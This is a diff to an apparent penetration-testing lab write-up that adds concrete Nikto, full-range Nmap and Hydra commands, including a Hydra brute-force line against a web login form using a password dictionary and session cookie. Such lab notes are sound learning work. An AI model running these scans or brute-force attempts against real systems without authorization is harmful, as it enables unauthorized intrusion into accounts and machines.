@@ -12,8 +12,14 @@ Gain access to the target system.
 - Nikto
 - Hydra
 
-### 🔍 Exploitation:
-Hydra brute force on admin login, retrieved the name and password using cookies and rockyou.txt
+### 🔍 Vulnerabilty Scanning using Nikto:
+nikto -h 'ip_address' -o nikto_result.html -Format htm
+
+### 🔍 Network Security Scan using Nmap:
+nmap -p 1-65535 'ip_address'
+
+### 🔍 Exploitation Bruteforce using Hydra:
+hydra -l admin -P [path_to_password_dictionary] 'http-get-form://ip_address/:username=^USER^&password=^PASS^&Login=submit:H=cookies_content:Username and/or Password incorrect'
 
 ### 🧠 Lessons Learned:
 Learned about brute forcing using Hydra, scanning vulnerability using Nikto, and finding the open port using Nmap.
